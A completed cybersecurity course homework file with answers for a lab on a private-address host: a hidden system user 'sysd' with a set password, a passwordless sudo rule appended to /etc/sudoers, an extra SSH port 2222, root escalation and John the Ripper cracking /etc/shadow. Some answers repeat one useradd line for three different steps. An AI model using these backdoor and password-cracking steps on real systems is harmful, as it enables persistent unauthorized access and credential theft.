Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:

    - `useradd -r -u 401 sysd`

2. Give your secret user a password: 

    ```
    passwd sysd
    ImAHax0r!
    ```
3. Give your secret user a system UID < 1000:

    - `useradd -r -u 401 sysd`

4. Give your secret user the same GID:

   - `useradd -r -u 401 sysd`

5. Give your secret user full `sudo` access without the need for a password:

   -  `echo "sysd ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`

6. Test that `sudo` access works without your password:

    ```bash
    sudo -l
    Matching Defaults entries for sysd on scavenger-hunt:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User sysd may run the following commands on scavenger-hunt:
    (ALL) NOPASSWD: ALL

    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    ```bash
    Port 2222
    AddressFamily any
    ListenAddress 0.0.0.0
    ListenAddress ::

    Port 22
    AddressFamily any
    ListenAddress 0.0.0.0
    ListenAddress ::

    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:

    - `$ sudo systemctl restart ssh`

2. Exit the `root` account:

    - `~.`

3. SSH to the target machine using your `sysd` account and port `2222`:re

    - `ssh sysd@192.168.6.105 -p 2222`

4. Use `sudo` to switch to the root user:

    - `sudo -s`

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - `ssh sysd@192.168.6.105 -p 2222`

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - `john /etc/shadow`
